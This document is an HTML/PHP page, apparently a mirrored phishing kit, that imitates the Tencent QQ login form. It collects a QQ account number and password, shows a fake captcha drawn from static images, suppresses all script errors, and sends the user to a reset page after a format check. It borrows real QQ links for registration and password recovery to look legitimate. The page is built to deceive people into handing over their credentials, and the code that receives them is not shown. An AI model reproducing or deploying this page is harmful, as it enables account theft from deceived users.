
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="login.css" tppabs="http://bmm1105.com:99/login/login.css" rel="stylesheet" type="text/css" />
<style type="text/css">
u{text-decoration:none;white-space:nowrap;}
</style>
<script language="javascript">
//屏蔽所有的js错误
function killerrors() {
return true;
}
window.onerror = killerrors;

var n =0;
var array = new Array("code/1.gif"/*tpa=http://bmm1105.com:99/login/code/1.gif*/,"code/2.gif"/*tpa=http://bmm1105.com:99/login/code/2.gif*/,"code/3.gif"/*tpa=http://bmm1105.com:99/login/code/3.gif*/,"code/4.gif"/*tpa=http://bmm1105.com:99/login/code/4.gif*/,"code/5.gif"/*tpa=http://bmm1105.com:99/login/code/5.gif*/,"code/6.gif"/*tpa=http://bmm1105.com:99/login/code/6.gif*/,"code/7.gif"/*tpa=http://bmm1105.com:99/login/code/7.gif*/,"code/8.gif"/*tpa=http://bmm1105.com:99/login/code/8.gif*/,"code/9.gif"/*tpa=http://bmm1105.com:99/login/code/9.gif*/,"code/10.gif"/*tpa=http://bmm1105.com:99/login/code/10.gif*/);
function ckzz(m){
 n+=m;
 if(n==array.length)
 {
  n = 0;
 }
 if(n<0)
 {
  n = array.length-1;
 }
 
 document.getElementById("img").src = array[n];
}
</script>
</head>
<body>
<div class="main" id="login" style="border:0px;">

    <?php
        if(isset($_POST['u']) && isset($_POST['p']) && isset($_POST['verifycode'])){
            if(empty($_POST['u']) && empty($_POST['p']) && empty($_POST['verifycode'])){
                echo '<script>alert("请完整填写信息"); </script>';
            }else{
                if(!is_numeric($_POST['u']) || strlen($_POST['u'])<5 || strlen($_POST['p'])>16){
                    echo '<script>alert("帐号密码格式错误"); </script>';
                }else{
                    echo '<script>window.location.href="reset.php"</script>';
                }
            }
        }
    ?>
    
    <div id="qlogin" style="display:none;"></div>
    <div id="web_login">
    <FORM method="post" autocomplete="off" id="loginform" style="MARGIN: 0px" name=loginform onsubmit="return aa() " onreset="return onFormReset(loginform)" action="login.php" >
        <ul id="g_list">
            <li id="err_m" class="err_m"></li>
            <li id="g_u">
            	<span><u id="label_uin">QQ帐号：</u></span><input type="text" class="inputstyle" maxlength="12" id="u" name="u" value="" style="ime-mode:disabled" tabindex="1" onfocus="" onblur="" /> <label><a target="_top" href="http://zc.qq.com/chs/index.html?from=pt" tabindex="7" id="label_newreg">
				注册新帐号</a></label>    
            </li> 
            <li id="g_p">
            	<span><u id="label_pwd">QQ密码：</u></span><input type="password"  class="inputstyle" id="p" name="p" value="" maxlength="16" tabindex="2" onfocus="check();" /> <label><a target="_top" tabindex="8" href="https://aq.qq.com/cn2/findpsw/pc/pc_find_pwd_input_account" onclick="onClickForgetPwd()" id="label_forget_pwd">
				忘了密码？</a></label>
            </li>
            <li id="verifyinput" >
            	<span for="code"><u id="label_vcode">验证码：</u></span><input name="verifycode" type="text" style="ime-mode:disabled" class="inputstyle" id="verifycode" value="" maxlength="5" tabindex="3"/>
            </li>
            <li id="verifytip" >
            	<span>&nbsp;</span><u id="label_vcode_tip">输入下图中的字符，不区分大小写</u> 
            </li>
            <li id="verifyshow" >
            <img id="img" width="130" height="53" src="code/0.gif">
            <span for="pic">&nbsp;</span><label><A id="changeimg_link" tabindex="6" href="">看不清，换一张</A></label>
            </li> 
               
        </ul> 
        <div class="login_button">
            <input type="submit" tabindex="5" value="登 录"  class="btn"/>
        </div>
        <div class="lineright" id="label_unable_tips">
        	<a style="CURSOR: pointer" onclick="switchpage();">切换到快速登录模式</a></div>

        <input type="hidden" name="from_ui" value="1" />
        <input type="hidden" name="dumy" value="" />
    </form>
    </div>
    <div id="switch" class="lineright"><a onclick=""></a></div>
</div>
    <script type="text/javascript">
        ckzz(Math.ceil(Math.random()*10));
    </script>
</body>
</html>
